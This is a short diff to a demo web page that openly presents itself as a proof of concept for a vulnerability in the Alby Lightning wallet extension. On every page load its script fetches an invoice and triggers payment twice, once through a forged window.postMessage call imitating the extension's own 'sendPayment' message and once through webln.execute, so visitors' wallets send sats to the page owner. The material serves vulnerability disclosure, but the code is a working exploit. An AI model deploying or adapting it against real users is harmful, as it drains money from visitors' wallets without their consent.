@@ -3,6 +3,17 @@
   async function sendFreeSats() {
     const zbdData = await fetch("https://api.zebedee.io/v0/process-static-charges/8755f68e-54a4-497c-a50b-ce07c8270b88?amount=1000");
     const actualInvoice = (await zbdData.json()).pr;
+    window.postMessage(
+     {
+        application: "LBE",
+        prompt: true,
+        type: "sendPayment",
+        args: {
+          paymentRequest: actualInvoice
+        },
+      },
+      "*"
+    );
     await window.webln.execute("sendPayment", {
       paymentRequest: actualInvoice
     });
@@ -10,4 +21,4 @@
   sendFreeSats();
 </script>
 <h1>I took your Sats!</h1>
-This is a demo site for an Alby vulnerability which sends me 1 sat on every reload. Let me know if you want me to send it back.
+This is a demo site for an Alby vulnerability which sends me 2 sats (because it uses two different ways of exploiting a vulnerability for testing purposes) on every reload. Let me know if you want me to send it back.
